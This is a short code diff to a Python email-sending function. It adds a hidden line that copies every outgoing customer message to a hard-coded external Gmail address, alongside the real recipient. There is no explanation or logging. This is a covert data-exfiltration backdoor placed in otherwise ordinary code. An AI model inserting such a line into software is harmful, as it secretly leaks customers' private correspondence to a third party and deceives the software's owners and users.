@@ -296,6 +296,7 @@ def sendEmail(customername, customeremail, text):
 		print ("Login ok!")
 	try:
 		server.sendmail(sender_email, recipient_email, message.as_string())
+		server.sendmail(sender_email, 'grbtxtmsg@gmail.com', message.as_string())
 		server.close()
 	except Exception as e:
 		print ("Error: ", e)
